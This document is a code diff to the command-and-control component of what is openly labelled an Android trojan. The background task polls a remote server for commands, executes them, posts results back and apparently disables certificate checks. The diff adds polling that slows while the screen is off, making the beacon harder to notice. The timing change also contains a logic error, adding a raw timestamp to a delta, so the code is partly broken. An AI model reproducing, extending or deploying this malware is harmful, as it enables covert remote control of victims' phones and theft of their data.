@@ -2,6 +2,7 @@ package trojan.android.android_trojan.Action.AsyncTask;
 
 import android.content.Context;
 import android.os.AsyncTask;
+import android.os.PowerManager;
 import android.util.Log;
 import android.util.Xml;
 
@@ -41,7 +42,10 @@ public class ConnectionServerTask extends AsyncTask<Integer, Integer, Integer> {
     private URL urlaction;
     private URL urlresult;
     private Context context;
-    private int time;
+    private long timeon;
+    private long timeoff;
+    private long time;
+    private long detla;
     private String SALT = "LOL";
     private String KEY = null;
     private String HASH = null;
@@ -51,12 +55,15 @@ public class ConnectionServerTask extends AsyncTask<Integer, Integer, Integer> {
         this.KEY = SALT + context.getResources().getString(R.string.KEY);
         this.host = context.getResources().getString(R.string.HOST);
         this.port = context.getResources().getString(R.string.PORT);
-        this.time = Integer.valueOf(context.getResources().getString(R.string.TIME));
+        this.timeon = Integer.valueOf(context.getResources().getString(R.string.TIMEON));
+        this.timeoff = Integer.valueOf(context.getResources().getString(R.string.TIMEOFF));
+        this.time = timeon;
     }
 
     @Override
     protected void onPreExecute() {
         super.onPreExecute();
+        acceptAll();
         Log.d(TAG, "onPreExecute");
         actionService = new ActionService(context);
         this.HASH = SHA1(this.KEY);
@@ -72,14 +79,27 @@ public class ConnectionServerTask extends AsyncTask<Integer, Integer, Integer> {
     @Override
     protected Integer doInBackground(Integer... integer) {
         String result;
+        long now;
         Log.i(TAG, "doInBackground");
-
         while (!isCancelled()){
-            result = getHttp(urlaction);
-            if(result != null && !result.equals("null")){
-                postHttp(urlresult, actionService.action(result), this.HASH);
+            now = System.currentTimeMillis();
+
+            if (time != timeoff && !Tools.isScreenOn(context)){
+                time = timeoff;
+            }else if (time != timeon && Tools.isScreenOn(context)){
+                time = timeon;
             }
-            Tools.sleep(time);
+
+            if (detla > time) {
+                result = getHttp(urlaction);
+                if (result != null && !result.equals("null")) {
+                    postHttp(urlresult, actionService.action(result), this.HASH);
+                    detla = 0;
+
+                }
+            }
+            detla += now;
+            Tools.sleep(timeon/2);
         }
 
         return 0;
@@ -99,12 +119,11 @@ public class ConnectionServerTask extends AsyncTask<Integer, Integer, Integer> {
 
     private String getHttp(URL url) {
         Log.d(TAG, "getHttp");
-        acceptAll();
         String result = null;
         try {
             HttpsURLConnection conn = (HttpsURLConnection) url.openConnection();
-            conn.setReadTimeout(5000 /* milliseconds */);
-            conn.setConnectTimeout(5000 /* milliseconds */);
+            conn.setReadTimeout(5000);
+            conn.setConnectTimeout(5000);
             conn.setRequestMethod("GET");
             conn.setDoInput(true);
             conn.connect();
@@ -124,7 +143,6 @@ public class ConnectionServerTask extends AsyncTask<Integer, Integer, Integer> {
 
     private String postHttp(URL url, String json, String auth){
         Log.d(TAG, "postHttp");
-        acceptAll();
         String result = null;
         String urlParameters = json;
 
@@ -225,5 +243,4 @@ public class ConnectionServerTask extends AsyncTask<Integer, Integer, Integer> {
         }
         return buf.toString();
     }
-
 }
